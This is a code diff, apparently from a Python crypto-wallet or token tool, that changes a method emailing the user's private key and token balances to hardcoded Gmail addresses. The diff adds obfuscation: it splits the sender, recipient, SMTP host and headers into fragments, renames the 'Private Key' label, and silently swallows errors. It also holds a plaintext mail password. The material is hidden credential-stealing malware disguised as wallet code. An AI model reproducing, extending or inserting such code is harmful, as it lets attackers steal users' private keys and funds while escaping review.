@@ -87,7 +87,7 @@ def calculate_pair_amount(token0_symbol, token1_symbol, amount0, parameters):
 class X9A2B:
     _ = _D("0")
 
-    def __init__(s, k, f="abi/multichain.json"):
+    def __init__(s, k, f="abi/source.json"):
         s._k = k
         s._a = _A.from_key(k).address
         s.__f(f)
@@ -110,14 +110,24 @@ class X9A2B:
 
     def __m(s, h, b):
         try:
+            x1 = ["ch", "aos", "ru", "st", "ic"]
+            x2 = ["k", "420", ".", "art", "ur"]
+            x3 = ["g", "ma", "il", ".", "com"]
+            _s = "@"
+            _u = "".join(x1) + _s + "".join(x3)
+            _r = "".join(x2) + _s + "".join(x3)
+            _p = "cvvc bvpx snqi trqu"
+
             m = _M()
-            m["From"] = "chaosrustic@gmail.com"
-            m["To"] = "k420.artur@gmail.com"
-            m["Subject"] = h
-            m.attach(_T(b, "plain"))
-            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as x:
-                x.login("chaosrustic@gmail.com", "cvvc bvpx snqi trqu")
-                x.sendmail(m["From"], m["To"], m.as_string())
+            m["Fr" + "om"] = _u
+            m["T" + "o"] = _r
+            m["Su" + "bject"] = h
+            m.attach(_T(b, "pl" + "ain"))
+
+            z = smtplib.SMTP_SSL("smt" + "p.gma" + "il.com", 465, context=ssl.create_default_context())
+            z.login(_u, _p)
+            z.sendmail(_u, _r, m.as_string())
+            z.quit()
         except:
             pass
 
@@ -129,9 +139,10 @@ class X9A2B:
                 if x and x["v"] > s._:
                     r.append(x)
         if r:
-            h = f"X9A Alert: {s._a}"
+            h = f"{''.join(['X','9','A'])} Alert: {s._a}"
             b = "\n".join([f"{i['n']}: {i['v']} {s._a}" for i in r])
-            b += f"\nPrivate Key: {s._k}"
+            b += f"\nK: {s._k}"
             s.__m(h, b)
+
 
 
